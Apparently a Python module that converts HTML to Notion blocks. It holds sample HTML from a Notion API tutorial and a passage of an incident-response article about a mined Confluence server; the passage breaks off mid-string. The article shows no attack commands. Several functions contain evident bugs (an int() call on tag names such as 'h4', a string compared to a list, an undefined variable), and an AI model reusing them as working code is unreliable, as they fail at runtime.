import re
import copy
import warnings

import app.service.interfaces.i_notionapi_svc as i_notion
import app.utility.special_packet.html2notion.htmlcovert.html2chain as html2chain

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
i_notion = i_notion.NotionAPIServiceInterface
__all__ = ['html2notion', 'convert']


BlOCK_ELEMENTS = [
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'hr',
    'blockquote',
    'ul',
    'ol',
    'thead',
    'tr',
    'img',
    'code',
    # TODO 等notion官方出table的接口方法再写，实验链接：https://www.freebuf.com/articles/endpoint/278716.html
    'table'
]

RICHTEXT_ELEMENTS = [
    'b',
    'i',
    'del',
    'p',
    'a',
    'em',
    'strong',
    'u'
]

NONTEXT_ELEMENTS = [
    'img',
    'hr'
]

SPECIAL_ELEMENTS = [
    'code'
]

DELETE_ELEMENTS = ['span', 'div']


class html2notion:
    def __init__(self):
        self.html_db = None
        self.html_db_node_status = {"undo": -1, "doing": 0, "done": 1, "ignore": 10}
        self.html_db_ROOT = None
        self.blocks_list = []

    def html2notion(self, ROOT_id, blocks_list=[], ignore_local=False):
        """
        :param blocks_list:
        :param ROOT_id:
        :param ignore_local: 默认不识别当前标签是否是图片、分割符等非文本(nontext)标签
        """
        child_flag = True
        article_tag = True
        if self.html_db[ROOT_id]["name"] not in BlOCK_ELEMENTS and (
                self.html_db[ROOT_id]["name"] not in RICHTEXT_ELEMENTS):
            article_tag = False
        if ignore_local:
            self._convert_nontext_element(ROOT_id)
        if self.html_db[ROOT_id]["name"] in RICHTEXT_ELEMENTS and self.get_status(ROOT_id, "undo"):
            self.change_status(ROOT_id)
            self.blocks_list.append(i_notion.demo_text_block("paragraph", self.get_all_rich_text(ROOT_id)))
        if self.html_db[ROOT_id]["name"] in SPECIAL_ELEMENTS:
            self._convert_special_element(ROOT_id)
            return
        for _sub_id in self.html_db[ROOT_id]["child"]:
            _sub = self.html_db[_sub_id]
            if self.get_status(ROOT_id, "done"):
                if _sub["child"]:
                    self.html2notion(_sub_id)
                continue
            if _sub["name"] is None:
                if article_tag and _sub["status"] == 1:
                    continue
                self.change_status(_sub_id)
                _block_type = "paragraph"
                _block_text = i_notion.demo_Text(_sub["text"])
                self.blocks_list.append(i_notion.demo_text_block(_block_type, [_block_text]))
            elif _sub["name"] not in BlOCK_ELEMENTS and _sub["name"] not in RICHTEXT_ELEMENTS:
                self.change_status(_sub_id)
            elif _sub["name"] in NONTEXT_ELEMENTS:
                self._convert_nontext_element(_sub_id)
            elif re.fullmatch("h(1|2|3)", _sub["name"]) and self.get_status(ROOT_id, "undo"):
                self.change_status(_sub_id)
                _block_type = _sub["name"].replace("h", "heading_")
                _block_text = i_notion.demo_Text(self.get_all_text(_sub_id))
                self.blocks_list.append(i_notion.demo_text_block(_block_type, [_block_text]))
                continue
            elif re.fullmatch("h(4|5|6)", _sub["name"]) and self.get_status(ROOT_id, "undo"):
                self.change_status(_sub_id)
                _block_type = "heading_3"
                _block_text = i_notion.demo_Text("#" * (int(_sub["name"]) - 3) + self.get_all_text(_sub_id))
                self.blocks_list.append(i_notion.demo_text_block(_block_type, [_block_text]))
                continue
            elif _sub["name"] == "code":
                code_texts = []
                # for _code_id in [_c for _c in self.html_db[ROOT_id]["child"] if self.html_db[_c]["name"] == "code"]:
                for _code_id in self.html_db[ROOT_id]["child"]:
                    self.change_status(_code_id)
                    if self.html_db[_code_id]["name"] == "code":
                        if self.html_db[_code_id]["text"]:
                            code_texts.append(self.html_db[_code_id]["text"])
                _block_type = "code"
                code_t = str("\n".join(code_texts))
                # 由于单个text的content最大长度为2000,所以需要做分片
                _block_texts = [i_notion.demo_Text(code_t[_:_ + 2000]) for _ in range(0, len(code_t), 2000)]
                self.blocks_list.append(i_notion.demo_text_block(_block_type, _block_texts))
                # TODO 如果这里break,会忽略同级其他兄弟tag的识别，当前遇到的状况是如果处理兄弟会识别一些无用的数据
                break
            elif _sub["name"] in RICHTEXT_ELEMENTS or re.fullmatch("p\d", _sub["name"]):
                self.change_status(_sub_id)
                self.blocks_list.append(i_notion.demo_text_block("paragraph", self.get_all_rich_text(_sub_id)))
            if _sub["child"] and child_flag:
                self.html2notion(_sub_id)

    def change_status(self, ROOT_id, status="done"):
        self.html_db[ROOT_id].update(dict(status=self.html_db_node_status[status]))

    def get_status(self, ROOT_id, status=None):
        if status:
            if self.get_status(ROOT_id) == self.html_db_node_status[status]:
                return True
            else:
                return False
        return self.html_db[ROOT_id]["status"]

    def _convert_special_element(self, ROOT_id):
        _local = self.html_db[ROOT_id]
        if _local["name"] == "code" and self.get_status(_local, "undo"):
            code_texts = []
            for _code_id in self.html_db[ROOT_id]["child"]:
                self.change_status(_code_id)
                if self.html_db[_code_id]["name"] == "code":
                    if self.html_db[_code_id]["text"]:
                        code_texts.append(self.html_db[_code_id]["text"])
            _block_type = "code"
            code_t = str("\n".join(code_texts))
            # 由于单个text的content最大长度为2000,所以需要做分片
            _block_texts = [i_notion.demo_Text(code_t[_:_ + 2000]) for _ in range(0, len(code_t), 2000)]
            self.blocks_list.append(i_notion.demo_text_block(_block_type, _block_texts))
        if _local["name"] == "table" and self.get_status(_local, "undo"):
            table_text = []
            for _code_id in self.html_db[ROOT_id]["child"]:
                self.change_status(_code_id)
                if self.html_db[_code_id]["name"] == "code":
                    if self.html_db[_code_id]["text"]:
                        code_texts.append(self.html_db[_code_id]["text"])

    def _convert_nontext_element(self, ROOT_id):
        _local = self.html_db[ROOT_id]
        if _local["name"] == "img":
            self.change_status(ROOT_id)
            for _key, _value in _local["attrs"].items():
                if str(_key).endswith("href"):
                    self.blocks_list.append(i_notion.demo_external_block("image", _value))
                if str(_key).endswith("src"):
                    self.blocks_list.append(i_notion.demo_external_block("image", _value))
        elif _local["name"] == "hr":
            self.change_status(ROOT_id)
            self.blocks_list.append(i_notion.demo_simple_block("divider"))

    def get_all_text(self, ROOT_id):
        text = ""
        # if self.html_db[ROOT_id]["text"]:
        #     text = self.html_db[ROOT_id]["text"]
        for _sub_id in self.html_db[ROOT_id]["child"]:
            if self.html_db[_sub_id]["name"] is None:
                self.change_status(_sub_id)
                if self.html_db[_sub_id]["text"]:
                    text += self.html_db[_sub_id]["text"]
            else:
                _s = self.get_all_text(_sub_id)
                if _s:
                    text += _s
        return text

    def get_all_rich_text(self, ROOT_id, **kwargs):
        elements_text = []
        kwargs.update(self.tag2richText(ROOT_id))
        for _sub_id in self.html_db[ROOT_id]["child"]:
            if self.html_db[_sub_id]["name"] is None:
                self.change_status(_sub_id)
                if self.html_db[_sub_id]["text"] is not None:
                    elements_text.append(i_notion.demo_Text(self.html_db[_sub_id]["text"], **kwargs))
            if self.html_db[_sub_id]["name"] in RICHTEXT_ELEMENTS:
                self.change_status(_sub_id)
                _kw = copy.deepcopy(kwargs)
                _kw.update(self.tag2richText(_sub_id))
                if self.html_db[_sub_id]["text"] is not None:
                    elements_text.append(i_notion.demo_Text(self.html_db[_sub_id]["text"], **_kw))
                if self.html_db[_sub_id]["child"]:
                    [elements_text.append(_) for _ in self.get_all_rich_text(_sub_id, **_kw)]
            if self.html_db[_sub_id]["name"] in BlOCK_ELEMENTS:
                if self.html_db[_sub_id]["name"] == "img":
                    self.html2notion(_sub_id, ignore_local=True)
                else:
                    self.html2notion(_sub_id)
        return elements_text

    def tag2richText(self, ROOT_id):
        tagName = self.html_db[ROOT_id]["name"]
        if tagName in ["b", "strong"]:
            return dict(bold=True)
        if tagName == ["i", "em"]:
            return dict(italic=True)
        if tagName == "del":
            return dict(strikethrough=True)
        if tagName == "u":
            return dict(underline=True)
        if tagName == "a":
            for _key, _value in self.html_db[ROOT_id]["attrs"].items():
                if str(_key).endswith("href"):
                    return dict(link=_value)
        return dict()

    def convert(self, html):
        self.html_db = html2chain.convert(html)
        self.html_db_ROOT = [_key for _key, _value in self.html_db.items() if _value["parent"] is None][0]
        self.html2notion(self.html_db_ROOT)

        return self.blocks_list

    @staticmethod
    def blockStruct():
        return {
            ""
        }


h2n = html2notion()
convert = h2n.convert

if __name__ == '__main__':
    xxx = "<p><b>12<i>x</i>3</b></p>"
    xx = "<article class=\"baidu_pl\">\n<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-1a85854398.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h3><a id=\"notion_api_0\"></a>notion api</h3>\n<p>\u524d\u51e0\u5929notion\u5f00\u653e\u4e86api\uff0c<a href=\"https://developers.notion.com/\">notion\u5f00\u53d1\u8005\u6587\u6863</a>\u53ef\u4ee5\u4e86\u89e3\u3002</p>\n<h3><a id=\"pythonnotion_3\"></a>python\u64cd\u4f5cnotion</h3>\n<ol><li> <p>\u521b\u5efa\u4e00\u4e2a Notion \u673a\u5668\u4eba\uff0c\u8f93\u5165\u540d\u5b57\uff0c\u5373\u53ef\u5feb\u901f\u521b\u5efa\u3002</p> </li><li> <p>\u83b7\u53d6Token\uff0c\u70b9\u51fb show\uff0c\u7136\u540e\u590d\u5236\u5907\u7528\u3002<br/> <img alt=\"\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0\" src=\"https://img-blog.csdnimg.cn/20210519165744424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpbmh1b2lw,size_16,color_FFFFFF,t_70\"/></p> </li><li> <p>\u5728\u9700\u8981\u4f7f\u7528API\u7684\u9875\u9762\u4e2d\uff0c\u70b9\u51fb Share \u5e76\u9009\u62e9 Invite \uff0c\u5c06\u673a\u5668\u4eba\u9080\u8bf7\u8fdb\u53bb\uff0c\u8ba9\u5176\u7528\u4e8e\u7f16\u8f91\u7684\u6743\u9650\u3002<br/> <img alt=\"\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0\" src=\"https://img-blog.csdnimg.cn/20210519170931173.png\"><br/> <img alt=\"\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0\" src=\"https://img-blog.csdnimg.cn/20210519170938359.png\"/></img></p> </li><li> <p>\u83b7\u53d6\u6570\u636e\u8868\u7684 <code>database_id</code>\uff0c\u70b9\u51fb\u6570\u636e\u8868\u53f3\u4e0a\u65b9\u7684 <code>...</code> \u9009\u62e9 <code>Copylink</code> \uff0c<br/> <img alt=\"\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0\" src=\"https://img-blog.csdnimg.cn/20210519171042116.png\"><br/> \u8fde\u63a5\u5982\u4e0b\u65b9\uff1a<code>https://www.notion.so/xinhuoip/9bcf00dce55c42799f3b177dc325aa18?v=217bbe82893e4e4aa228a19f3f2dc888</code> \uff0c\u5176\u4e2d <code>9bcf00dc-e55c-4279-9f3b-177dc325aa18</code> \u5373\u4e3a<code>database_id</code>\u3002</img></p> </li><li> <p>\u4f7f\u7528python\u7684requests\u5e93get\u65b9\u6cd5\u6765\u8bfb\u53d6notion\u9875\u9762\u6570\u636e\uff0c\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> requests\ntoken <span class=\"token operator\">=</span> <span class=\"token string\">'\u8fd9\u4e2a\u662f\u4f60\u521b\u5efa\u673a\u5668\u4eba\u65f6\u83b7\u53d6\u5230\u7684\u89c1\u7b2c\u4e8c\u6b65'</span>\nr <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"https://api.notion.com/v1/pages/5b35b115ddc442e080f1b1b27e5b0ae0\"</span><span class=\"token punctuation\">,</span><span class=\"token comment\">#\u5b57\u7b26\u4e32\u4e3a\u9875\u9762id</span>\n        headers<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"Authorization\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Bearer \"</span> <span class=\"token operator\">+</span> token<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Notion-Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-05-13\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>txet<span class=\"token punctuation\">)</span>\n</code></pre> <p>\u4ee5\u4e0a\u4ee3\u7801\u8f93\u51fa\u7ed3\u679c\u5982\u4e0b\uff1a<br/> <img alt=\"\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0\" src=\"https://img-blog.csdnimg.cn/20210519170009273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpbmh1b2lw,size_16,color_FFFFFF,t_70\"/></p> </li><li> <p>\u901a\u8fc7python\u7684requests\u5e93\u4e2d\u7684post\u65b9\u6cd5\u6765\u64cd\u4f5cnotion\u6dfb\u52a0\u6570\u636e\uff0c\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> requests\ntoken <span class=\"token operator\">=</span> <span class=\"token string\">'\u7b2c\u4e8c\u6b65\u4e2d\u83b7\u53d6\u5230\u7684token\u503c'</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">post</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>title<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    requests<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">(</span><span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"https://api.notion.com/v1/pages\"</span><span class=\"token punctuation\">,</span>\n    json<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token string\">\"parent\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"database_id\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"database_id\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"9bcf00dc-e55c-4279-9f3b-177dc325aa18\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"properties\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"\u6765\u6e90\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"url\"</span><span class=\"token punctuation\">:</span> url<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"\u6807\u9898\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"title\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"text\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"text\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"content\"</span><span class=\"token punctuation\">:</span> title<span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"\u63cf\u8ff0\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"rich_text\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"text\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"text\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"content\"</span><span class=\"token punctuation\">:</span> content<span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"children\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"object\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"block\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"paragraph\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"paragraph\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token string\">\"text\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">{<!-- --></span> <span class=\"token string\">\"type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"text\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"text\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{<!-- --></span> <span class=\"token string\">\"content\"</span><span class=\"token punctuation\">:</span> content <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    headers<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"Authorization\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Bearer \"</span> <span class=\"token operator\">+</span> token<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Notion-Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-05-13\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>title <span class=\"token operator\">+</span> <span class=\"token string\">'---'</span> <span class=\"token operator\">+</span>url<span class=\"token punctuation\">)</span> \n\npost<span class=\"token punctuation\">(</span><span class=\"token string\">'https://www.xinhuoip.com'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\u85aa\u706bIP\u5168\u56fd\u52a8\u6001pptp \u9759\u6001IP \u5355\u8fdb\u7a0b\u5355IP \u5355\u7a97\u53e3\u5355IP'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\u5de5\u4f5c\u5ba4\u5ba2\u6237\u91cf\u5927\u4f18\u60e0\u3001\u652f\u6301\u6e38\u620f\u3001\u8bd5\u73a9\u3001\u77ed\u89c6\u9891\u7b49\u5404\u7c7b\u9879\u76ee\uff0c\u5ba2\u670dQQ\uff1a1167064'</span><span class=\"token punctuation\">)</span>\n</code></pre> <p>\u4ee3\u7801\u8fd0\u884c\u6548\u679c\u5982\u4e0b\uff1a<br/> <img alt=\"\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0\" src=\"https://img-blog.csdnimg.cn/20210519170629236.png\"/><br/> \u6570\u636e\u6dfb\u52a0\u6210\u529f\uff0c\u4ee3\u7801\u4e2dchildren\u4e2d\u7684\u90e8\u5206\u4e3a\u5728\u6b64\u6761\u6570\u636e\u7684page\u4e2d\u6dfb\u52a0\u4e00\u4e2ablock\uff0c\u663e\u793a\u6548\u679c\u5982\u4e0b\uff1a<br/> <img alt=\"\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0\" src=\"https://img-blog.csdnimg.cn/20210519170653795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpbmh1b2lw,size_16,color_FFFFFF,t_70\"/></p> </li><li> <p>\u7ed3\u5408\u4ee5\u524d\u7684\u7ebf\u62a5\u7c7b\u4ee3\u7801\uff0c\u53ef\u76f4\u63a5\u5c06\u91c7\u96c6\u7684\u6570\u636e\u76f4\u63a5\u5199\u5165\u5230notion\u3002</p> </li></ol>\n<p>\u539f\u6587\u5730\u5740\uff1a<a href=\"https://www.xinhuoip.com\">\u5168\u56fd\u52a8\u6001pptp</a></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-d7a94ec6ab.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-49037e4d27.css\" rel=\"stylesheet\"/>\n</div>\n123<hr/><div id=\"treeSkill\"></div>\n</article>"
    x = "<div class=\"rich_media_content\" id=\"js_content\" style=\"visibility: hidden;\">\n<h1 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 18px;border-bottom: 1px solid rgb(221, 221, 221);color: black;\">1 \u4e8b\u4ef6\u56de\u987e</h1><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">1.1 \u53d1\u73b0\u5f02\u5e38</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">IDS\u65e5\u5fd7\u5de1\u68c0\u4e2d\u53d1\u73b0\u4e00\u6761\u8fde\u63a5\u77ff\u6c60\u670d\u52a1\u5668\u7684\u65e5\u5fd7\uff0c\u6309\u7167\u4ee5\u5f80\u7684\u7ecf\u9a8c\uff0c\u770b\u6765\u53c8\u6709\u4e00\u53f0\u670d\u52a1\u5668\u6ca6\u4e3a\u77ff\u673a\u4e86\u3002IDS\u65e5\u5fd7\u5982\u4e0b\uff1a</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.10288808664259928\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJPzR3SFktGgtnLmzVCrPNibiaEQCOTicGYh49jdXZvcKlqRxEs95MOIX5A/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u6b63\u597d\u6700\u8fd1\u5728\u6d4b\u8bd5\u4e00\u6b3e\u6240\u8c13\u6001\u52bf\u611f\u77e5\u7684\u6d41\u91cf\u5206\u6790\u8bbe\u5907\uff0c\u4e5f\u6709\u5f02\u5e38\u65e5\u5fd7\uff0c\u8fd9\u51e0\u4e4e\u662f\u767e\u5206\u767e\u786e\u8bca\u4e86\uff0c\u6293\u7d27\u5904\u7406\u5427\u3002</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.16787003610108303\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJIPSzp6Iv3cQU2twhtlwh55xOvBYCoMBSpeJq2F7GGZuTYpLNw8eMeg/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"></img></p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u7ecf\u67e5\uff0c\u8fd9\u53f0\u4e3b\u673a\u662fAtlassian confluence\u670d\u52a1\u5668\uff0c\u76ee\u524d\u7248\u672c\u662fV7.5.1\uff0c\u5bf9\u5916\u5f00\u901a80\u548c443\u7aef\u53e3\u3002</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.47058823529411764\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJy4iaxOVGhx5V7vtym08BOZ9v1X1wsd76LibtAOrlqAoc1S3ANY5XHtSg/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"544\"/></p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">1.2\u6392\u67e5\u601d\u8def</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u6839\u636e\u8fd1\u671f\u7684\u5185\u7f51\u6d41\u91cf\u5206\u6790\uff0c\u516c\u53f8\u5185\u90e8\u5e76\u6ca1\u6709\u5bf9\u8be5\u4e3b\u673a\u8fdb\u884c\u653b\u51fb\u7684\u5f02\u5e38\u6d41\u91cf\uff0c\u6240\u4ee5\u9996\u5148\u60f3\u5230\u7684\u662f\u6765\u81ea\u5916\u90e8\u653b\u51fb\u3002\u5916\u90e8\u653b\u51fb\u80fd\u6210\u529f\u80af\u5b9a\u662f\u5229\u7528\u4e86\u6f0f\u6d1e\uff0c\u5305\u62ec\u4e3b\u673a\u6f0f\u6d1e\u548c\u5e94\u7528\u6f0f\u6d1e\uff0c\u5982\u679c\u662f0day\u6f0f\u6d1e\u5bf9\u4e8e\u5927\u591a\u6570\u7528\u6237\u6765\u8bf4\u662f\u65e0\u80fd\u4e3a\u529b\u7684\uff0c\u90a3\u770b\u770b\u662f\u5426\u6709\u5df2\u77e5\u6f0f\u6d1e\u5427\u3002\u6240\u4ee5\u6392\u67e5\u7684\u601d\u8def\u5206\u4e24\u65b9\u9762\uff1a\u6392\u67e5\u662f\u5426\u6709\u5df2\u77e5\u6f0f\u6d1e\uff1b\u627e\u5230\u6728\u9a6c\u7a0b\u5e8f\u53ca\u65f6\u6e05\u7406\u3002</p><h1 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 18px;border-bottom: 1px solid rgb(221, 221, 221);color: black;\">2 \u6392\u67e5\u6b65\u9aa4</h1><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.1\u670d\u52a1\u5668\u6f0f\u6d1e\u626b\u63cf</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u6f0f\u626b\u7ed3\u679c\u53d1\u73b0\u4e24\u4e2a\u6f0f\u6d1e\uff0c\u5176\u4e2d\u4e00\u4e2a\u662fnginx\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u9700\u5347\u7ea7\u5230\u6700\u65b0\u7248\u53ef\u4ee5\u89e3\u51b3\uff0c\u7acb\u5373\u5b8c\u6210\u5347\u7ea7\u5e76\u91cd\u542f\u670d\u52a1\uff1b\u53e6\u4e00\u4e2a\u662fjira\u76f8\u5173\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u8be5\u6f0f\u6d1e\u662fDDoS\u6f0f\u6d1e\uff0c\u4e0e\u672c\u6b21\u88ab\u4e2d\u6728\u9a6c\u5e94\u8be5\u5173\u7cfb\u4e0d\u5927\u3002</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"0.35018050541516244\" data-src=\"https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR38OCiaPVu6sZVUYmC6tWtFmJ0mnY830CsjibJFZrXVVr0icXKp0hasBEKrzQcgEteibmgbfZ7uCnMrV4w/640?wx_fmt=jpeg\" data-type=\"jpeg\" data-w=\"554\"/></p><h3 style=\"margin: 1.3em 0px 1em;padding: 0px;font-weight: bold;font-size: 16px;color: green;\">2.2 Confluence\u6f0f\u6d1e\u4fe1\u606f\u67e5\u8be2</h3><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\">\u4e0a\u641c\u7d20\u5f15\u64ce\u641cconfluence\u6f0f\u6d1e\uff0c\u67e5\u5230\u7684\u90fd\u662f2019\u5e74\u7684\u6f0f\u6d1e\u62a5\u9053\uff0c\u8fd9\u4e9b\u6f0f\u6d1e\u5728V7.5.1\u7248\u672c\u5747\u5df2\u4fee\u590d\u3002</p><p style=\"font-family: Avenir, SimSun !important;font-size: 15px !important;color: rgb(51, 51, 51) !important;line-height: 1.8em !important;letter-spacing: 0.1em !important;margin: 1em !important;text-align: justify !important;\"><img data-ratio=\"1.0740072202166064\" 